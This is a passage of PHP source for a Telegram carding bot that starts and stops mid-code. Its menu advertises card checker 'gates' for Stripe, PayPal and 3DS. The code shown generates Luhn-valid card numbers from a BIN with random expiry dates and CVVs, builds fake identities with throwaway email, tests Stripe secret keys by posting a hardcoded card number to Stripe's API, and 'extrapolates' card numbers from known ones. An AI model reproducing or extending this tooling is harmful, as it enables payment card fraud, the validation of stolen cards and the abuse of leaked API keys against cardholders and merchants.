elseif((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0))
{
$respuesta = "━━━━•⟮ ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs ⟯•━━━━\n\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n\n◤━━━━━ ☆. 𝙶𝙰𝚃𝙴𝚂 .☆ ━━━━━◥\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !stp\n⁕ Usage: !stp ccs|month|year|cvv\n\n🔥 Charged ($20) ✔\n➣ Checker ➟ !pa\n⁕ Usage: !pa ccs|month|year|cvv\n\n🔥 Charged ($1) ✔\n➣ Checker ➟ !ch\n⁕ Usage: !ch ccs|month|year|cvv\n\n🔥 Paypal ✔\n➣ Checker ➟ !pp\n⁕ Usage: !pp ccs|month|year|cvv\n\n🔥 Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Not Found ✔\n➣ Checker ➟ !str\n⁕ Usage: !str ccs|month|year|cvv\n\n◤━━━━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆ ━━━━━◥\n\n⌦ Bin Check ➟ !bin ✔\n⁕ Usage: !bin xxxxxx\n⌦ Checker IBAN ➟ !iban ✔\n⁕ Usage: !iban xxxxxx\n⌦ SK Key Check ➟ !ks ✔\n⁕ Usage: !ks ks_live_xxxx\n⌦ GEN ➟ !gen ✔\n⁕ Usage: !gen xxxxxx\n\n◤━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆ ━━◥\n\n° ᭄ Basica ➟ /extb ✔\n⁕ Usage: !extb ᴄᴄs1\n° ᭄ Similitud ➟ /exts ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Avanzada ➟ /exta ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Indentacion ➟ /exti ✔\n⁕ Usage: !extb ᴄᴄs1\n ᭄ Sophia ➟ /extm ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
//$respuesta = "━━━━•⟮ ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs ⟯•━━━━\n\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n\n◤━━━━━ ☆. 𝙶𝙰𝚃𝙴𝚂 .☆ ━━━━━◥\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !stp\n⁕ Usage: !stp ccs|month|year|cvv\n\n🔥 Stripe Auth 0.5$ ✔\n➣ Checker ➟ !ch\n⁕ Usage: !ch ccs|month|year|cvv\n\n🔥 Stripe Auth 1$ ✔\n➣ Checker ➟ !ck\n⁕ Usage: !chk ccs|month|year|cvv\n\n🔥 Charged 1$ ✔\n➣ Checker ➟ !stc\n⁕ Usage: !stc ccs|month|year|cvv\n\n🔥 Merchant ✔\n➣ Checker ➟ !stm\n⁕ Usage: !stm ccs|month|year|cvv\n\n🔥 Charged Refunded ✔\n➣ Checker ➟ !str\n⁕ Usage: !str ccs|month|year|cvv\n\n◤━━━━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆ ━━━━━◥\n\n⌦ Bin Check ➟ !bin ✔\n⁕ Usage: !bin xxxxxx\n⌦ Checker IBAN ➟ !iban ✔\n⁕ Usage: !iban xxxxxx\n⌦ SK Key Check ➟ !ks ✔\n⁕ Usage: !ks ks_live_xxxx\n⌦ GEN ➟ !gen ✔\n⁕ Usage: !gen xxxxxx\n\n◤━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆ ━━◥\n\n° ᭄ Basica ➟ /extb ✔\n⁕ Usage: !extb ᴄᴄs1\n° ᭄ Similitud ➟ /exts ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Avanzada ➟ /exta ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Indentacion ➟ /exti ✔\n⁕ Usage: !extb ᴄᴄs1\n ᭄ Sophia ➟ /extm ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!me") === 0)||(strpos($message, "/me") === 0)||(strpos($message, ".me") === 0))
{
	$respuesta = "[ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ:".$id."\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
//$respuesta = "⁕ ─ 𝑈𝑆𝐸𝑅 𝐼𝑁𝐹𝑂 ─ ⁕\n➩ 𝚄𝚂𝙴𝚁 𝙸𝙳: <code>".$id."</code>\n➩ 𝙵𝚄𝙻𝙻 𝙽𝙰𝙼𝙴: ".$Name." ".$last."\n➩ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴: @".$user."\n➩ 𝚄𝚂𝙴𝚁 𝚃𝚈𝙿𝙴: ".$tipo."\n";
	$respuesta = "     [ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ: <code>".$id."</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
	sendMessage($chat_id,$respuesta,$message_id);
}
//--------------------------END INFO-------------------------//


elseif((strpos($message, "!gen") === 0)||(strpos($message, "/gen") === 0)||(strpos($message, ".gen") === 0)){
$si = substr($message, 5);

if($si != ''){
}else{
$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$lista = substr($message, 5);
$target = substr($lista, 0,2);

$bin = explode("|", $lista)[0];
$mes1 = explode("|", $lista)[1];
$ano1 = explode("|", $lista)[2];
$cvv1 = explode("|", $lista)[3];
$d4 = "".$bin."xxxxxxxxxxxxxxxxx";

if ($target == "37" || $target == "34"){
        $bin = substr($d4, 0, 14);
        $cant = "15";

}else{
        $bin = substr($d4, 0, 15);
        $cant = "16";
}
	
$Bin = substr($bin, 0, 6);
$amount = "10";

if (empty($mes1)){
$mes1="rnd";
}
if (empty($ano1)){
$ano1="rnd";
}
if (empty($cvv1)){
$cvv1="rnd";
}
sleep(1);


for ($i=$amount;$i>-0;$i--){

//-------GERADOR DE MES - AÑO - CCV -------//
        $randMonth = rand(1, 12);
        $randYears = rand(25, 30);
if ($target == "37" || $target == "34"){
        $randCvv = rand(1000, 9999);
}else{
        $randCvv = rand(100, 999);
}
        $randMonth < 10 ? $randMonth = "0" . $randMonth : $randMonth = $randMonth;
        $randCvv < 100 ? $randCvv = "0" . $randCvv : $randCvv = $randCvv;
        $fecha = "|".$randMonth."|20".$randYears."|".$randCvv;

//-----GENERADOR DE CC------//
if(is_numeric($mes1)){
$mes = $mes1;
}else{
$mes = $randMonth;
}
if(is_numeric($ano1)){
$ano = $ano1;
}else{
$ano = "20$randYears";
}
if(is_numeric($cvv1)){
$cvv = $cvv1;
}else{
$cvv = $randCvv;
}
$data = "|$mes|$ano|$cvv";
            $ccNumber = $bin;
            while (strlen($ccNumber) < ($cant - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $ccNumber = str_split($ccNumber);
            $replace = "";
            foreach ($ccNumber as $cc => $key) {
            $replace .= str_replace("x", rand(0, 9), $key);
            }

$ccs = Calculate($replace, $cant);
$cards = $ccs.$data;
$data = "<code>".$cards."</code>";

$da = "".$data."\n";
        $archivo = fopen("cc-gen","a");
        fwrite($archivo,$da);
        fclose($archivo);
        }

        $ccs = file_get_contents("cc-gen");
$curl = curl_init('https://lookup.binlist.net/'.$Bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$result = curl_exec($curl);
curl_close($curl);
//---------------------------------------------//
$bank = capture($result, '"bank": {"name": "', '"');
$emoji = capture($result, '"emoji":"', '"');
$alpha = strtoupper(capture($result, '"alpha2":"', '"'));
$scheme = strtoupper(capture($result, '"scheme":"', '"'));
$type = strtoupper(capture($result, '"type":"', '"'));
$currency = capture($result, '"currency":"', '"');
//---------------------------------------------//
if (empty($bank)) {
$bank = "Unavailable";
}
if (empty($emoji)) {
$emoji = "Unavailable";
}
if (empty($alpha)) {
$alpha = "Unavailable";
}
if (empty($scheme)) {
$scheme = "Unavailable";
}
if (empty($type)) {
$type = "Unavailable";
}
if (empty($currency)) {
$currency = "Unavailable";
}
$curl = curl_init('https://binlist.io/lookup/'.$Bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$level = $binna['category'];
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
$count = "".$country." - ".$alpha." ".$emoji."";
if (empty($level)) {
$level = "Unavailable";
}
if (empty($brand)) {
$brand = "Unavailable";
}
if (empty($country)) {
$country = "Unavailable";
}
if (empty($type)) {
$type = "Unavailable";
}
if (empty($bank)) {
$bank = "Unavailable";
}
if (empty($currency)) {
$count = "Unavailable";
}
$Bin = "<code>$Bin</code>";

$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $brand - $type - $level\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";
editMessage($chat_id,$respuesta,$id_text);
unlink("cc-gen");
die();
}





elseif((strpos($message, "!fake") === 0)||(strpos($message, "/fake") === 0)||(strpos($message, ".fake") === 0)){

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = ucfirst($matches1[1][0]);
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = ucfirst($matches1[1][0]);
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = ucfirst($matches1[1][0]);
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = ucfirst($matches1[1][0]);
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = ucfirst($matches1[1][0]);
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
//---------------------------////---------------------------//
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
$link = "https://www.fakemailgenerator.com/#/$usr/$GmailUser/";

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);
$respuesta = "━━━━━━•⟮ғᴀᴋᴇ ᴜsᴇʀ⟯•━━━━━━\n➭ 𝙽𝙰𝙼𝙴: <code>".$name."</code>\n➭ 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴: <code>".$last."</code>\n➭ 𝙴𝙼𝙰𝙸𝙻: <code>".$email."</code> <a href='".$link."'>(ᴏᴘᴇɴ ʟɪɴᴋ)</a>\n➭ 𝚂𝚃𝚁𝙴𝙴𝚃: <code>".$street."</code>\n➭ 𝙲𝙸𝚃𝚈: <code>".$city."</code>\n➭ 𝚂𝚃𝙰𝚃𝙴: <code>".$state."</code>\n➭ 𝙿𝙷𝙾𝙽𝙴: <code>".$phone."</code>\n➭ 𝙿𝙾𝚂𝚃 𝙲𝙾𝙳𝙴: <code>".$postcode."</code>\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝚄𝚂𝙴𝚁: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: $admin\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);

}


elseif((strpos($message, "!ks") === 0)||(strpos($message, "/ks") === 0)||(strpos($message, ".ks") === 0)){
$si = substr($message, 4);
$key = substr($message, 4);

if(preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $key, $matches)) {
$sk = $matches[0][0];
}



if ($si != '' && $sk != '' ){
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ks sk_live_xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


// Bonus: SK Key Checker
$skhiden = substr_replace($sk, '',12).preg_replace("/(?!^).(?!$)/", "*", substr($sk, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$message = trim(strip_tags(getStr($result,'"message":"','.')));
if (empty($message)) {
$message = 'Charge Found';
}

if (strpos($result, 'api_key_expired')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK EXPIRED ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Expired API key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif (strpos($result, 'Invalid API Key provided')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK INVALID ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Invalid API Key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: You did not provide an API key.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Your account cannot currently make live charges.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK LIVE ✅\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ".$message.".\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
}



elseif((strpos($message, "!iban") === 0)||(strpos($message, "/iban") === 0)||(strpos($message, ".iban") === 0)){
$si = substr($message, 6);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ɪʙᴀɴ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .iban xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//$message = "/iban 4520880028518536|03|2023|854";
$ibanx = substr($message, 6);
$iban = substr($ibanx, 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO
$curl = curl_init('https://openiban.com/validate/'.$iban.'?validateBankCode=true&getBIC=true');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);

$bankcode1 = capture($content, '"bankCode": "', '"');
$bankname = capture($content, '"name": "', '"');
$zip = capture($content, '"zip": "', '"');
$city = capture($content, '"city": "', '"');
$bic = capture($content, '"bic": "', '"');
$timetakeen = (microtime(true) - $startTime);
$timetaken = substr_replace($timetakeen, '',4);

if(strpos($content, 'valid": true')){
$respuesta = "IBAN -LIVE ✅ $iban\nBIC: $bic\nBank Code: $bankcode1\nBank: $bankname\nCity: $city\nTime: $timetaken's\n━━━━━━━━━━━━━";
editMessage($chat_id,$respuesta,$id_text);
}
elseif(strpos($content, 'valid": false')){
$respuesta = "IBAN - DEAD ❌ $iban\nTime: $timetaken's";
editMessage($chat_id,$respuesta,$id_text);
}

}



elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
$si = substr($message, 5);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .bin xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$bin = substr($message, 5);

$bin = substr("$bin", 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO
$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$result = curl_exec($curl);
curl_close($curl);
//---------------------------------------------//
$bank = capture($result, '"bank": {"name": "', '"');
$emoji = capture($result, '"emoji":"', '"');
$alpha = strtoupper(capture($result, '"alpha2":"', '"'));
$scheme = strtoupper(capture($result, '"scheme":"', '"'));
$type = strtoupper(capture($result, '"type":"', '"'));
$currency = capture($result, '"currency":"', '"');
if (empty($bank)) {
$bank = "Unavailable";
}
if (empty($emoji)) {
$emoji = "Unavailable";
}
if (empty($alpha)) {
$alpha = "Unavailable";
}
if (empty($scheme)) {
$scheme = "Unavailable";
}
if (empty($type)) {
$type = "Unavailable";
}
if (empty($currency)) {
$currency = "Unavailable";
}
//---------------------------------------------//
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$level = $binna['category'];
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
$name = "".$country." - ".$alpha." ".$emoji."";
if (empty($level)) {
$level = "Unavailable";
}
if (empty($brand)) {
$brand = "Unavailable";
}
if (empty($country)) {
$country = "Unavailable";
}
if (empty($type)) {
$type = "Unavailable";
}
if (empty($bank)) {
$bank = "Unavailable";
}
if (empty($name)) {
$name = "Unavailable";
}
$bin = "<code>".$bin."</code>";

$respuesta = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$name."\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
//----------------------END CHECK BIN-----------------------//




elseif((strpos($message, "!extb") === 0)||(strpos($message, "/extb") === 0)||(strpos($message, ".extb") === 0)){
/////SOLO SE USA UN BIN ///

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ʙᴀsɪᴄ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extb xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$lista = substr($message, 6);
$i1     = explode("|", $lista);
$basic    = $i1[0];
$basica = substr("$basic", 0, 10);
$extb = "".$basica."xxxxxx";
$extb = "<code>".$extb."</code>";

$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐵𝐴𝑆𝐼𝐶𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extb."\n";
editMessage($chat_id,$respuesta,$id_text);
}




elseif((strpos($message, "!exts") === 0)||(strpos($message, "/exts") === 0)||(strpos($message, ".exts") === 0)){
///SE USAN 2 BINS//
$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sɪᴍɪʟ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exts xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//----------SIMILITUD----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$grupo1 = substr("$cc1", 6, 10);
$grupo2 = substr("$cc2", 6, 10);
//---------------BASICA-----------------/
$R1 = substr("$grupo1", 0, 1);
$R2 = substr("$grupo1", 1, 1);
$R3 = substr("$grupo1", 2, 1);
$R4 = substr("$grupo1", 3, 1);
$R5 = substr("$grupo1", 4, 1);
$R6 = substr("$grupo1", 5, 1);
$R7 = substr("$grupo1", 6, 1);
$R8 = substr("$grupo1", 7, 1);
$R9 = substr("$grupo1", 8, 1);
$R01 = substr("$grupo1", 9, 1);
//----------------------------
$R11 = substr("$grupo2", 0, 1);
$R12 = substr("$grupo2", 1, 1);
$R13 = substr("$grupo2", 2, 1);
$R14 = substr("$grupo2", 3, 1);
$R15 = substr("$grupo2", 4, 1);
$R16 = substr("$grupo2", 5, 1);
$R17 = substr("$grupo2", 6, 1);
$R18 = substr("$grupo2", 7, 1);
$R19 = substr("$grupo2", 8, 1);
$R10 = substr("$grupo2", 9, 1);
///-------------------------------//
if($R1 == "$R11" ){
$J1 = "$R1";
}else{
$J1 = "x";
}
if($R2 == "$R12" ){
$J2 = "$R2";
}else{
$J2 = "x";
}
if($R3 == "$R13" ){
$J3 = "$R3";
}else{
$J3 = "x";
}
if($R4 == "$R14" ){
$J4 = "$R4";
}else{
$J4 = "x";
}
if($R5 == "$R15" ){
$J5 = "$R5";
}else{
$J5 = "x";
}
if($R6 == "$R16" ){
$J6 = "$R6";
}else{
$J6 = "x";
}
if($R7 == "$R17" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R8 == "$R18" ){
$J8 = "$R8";
}else{
